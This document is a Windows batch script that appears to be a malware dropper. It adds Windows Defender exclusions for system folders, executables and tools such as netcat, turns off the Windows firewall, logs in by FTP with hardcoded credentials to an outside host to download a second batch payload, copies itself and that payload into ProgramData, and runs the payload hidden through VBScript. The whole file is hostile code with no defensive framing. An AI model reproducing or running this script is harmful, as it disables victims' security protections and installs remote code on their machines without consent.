echo Write-Host "Adding folder exclusions">pum.ps1
cls
echo Add-MpPreference -ExclusionPath C:\ProgramData, C:\Windows\System32>>pum.ps1
cls
echo Write-Host "Adding process exclusions">>pum.ps1
cls
echo Add-MpPreference -ExclusionProcess cmd.exe, nc.exe, nircmd.exe, batKEY.exe, wget.exe, htpcons.exe, setalc.exe, ncftpput.exe, ncftp.exe, ncftpget.exe, RAR.exe>>pum.ps1
cls
echo Write-Host "Adding extension exclusions">>pum.ps1
cls
echo Add-MpPreference -ExclusionExtension .exe, .bat>>pum.ps1
cls
ping localhost -n 1 >nul
cls
Powershell.exe -executionpolicy remotesigned -File pum.ps1
cls
ping localhost -n 3 >nul
cls
del pum.ps1
cls
netsh firewall set opmode disable
netsh advfirewall set allprofiles state off
cls
echo open dostg.ddns.net>LOGGIN.ftp
echo user lordbunny 125643>>LOGGIN.ftp
echo binary>>LOGGIN.ftp
echo get TWICE.bat>>LOGGIN.ftp
echo bye>>LOGGIN.ftp
ping localhost -n 2 >nul
ftp -n <LOGGIN.ftp
cls
ping localhost -n 2 >nul


del %~dp0\LOGGIN.ftp
mkdir C:\ProgramData\tool
copy /y %~f0 C:\ProgramData\tool\SUKABLYAT.BAT
copy /y TWICE.bat C:\ProgramData\tool\TWICE.bat
del TWICE.bat

cd C:\ProgramData\tool
echo set objshell = createobject("wscript.shell")>ini.vbs
echo objshell.run "TWICE.bat",vbhide>>ini.vbs
ini.vbs

